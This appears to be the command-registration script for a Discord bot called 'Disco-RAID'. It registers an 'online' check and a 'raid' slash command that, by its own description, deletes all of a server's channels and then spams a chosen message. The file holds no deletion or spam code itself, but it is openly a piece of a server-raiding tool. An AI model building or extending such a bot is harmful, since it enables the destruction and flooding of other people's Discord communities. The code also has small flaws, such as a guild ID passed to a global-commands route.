const { REST, Routes, ApplicationCommandOptionType } = require('discord.js');
require('dotenv').config({path:'../.env'})

const commands = [
    {
        name: 'online',
        description: 'Checks if Disco-RAID is online.',
    },
    {
      name: 'raid',
      description: "deletes all channels.",
      options : [
        {
        name: "raid-message",
        description: 'message that should be spammed afer raid.',
        type: ApplicationCommandOptionType.String,
      }
    ]
    },
 
];



const rest = new REST({ version: '10' }).setToken(process.env.TOKEN);

(async () => {
  try {
    console.log('Registering slash commands...');

    await rest.put(
      Routes.applicationCommands(
        process.env.CLIENT_ID,
        process.env.GUILD_ID
      ),
      { body: commands }
    );

    console.log('Slash commands were registered successfully!');
  } catch (error) {
    console.log(`There was an error: ${error}`);
  }
})();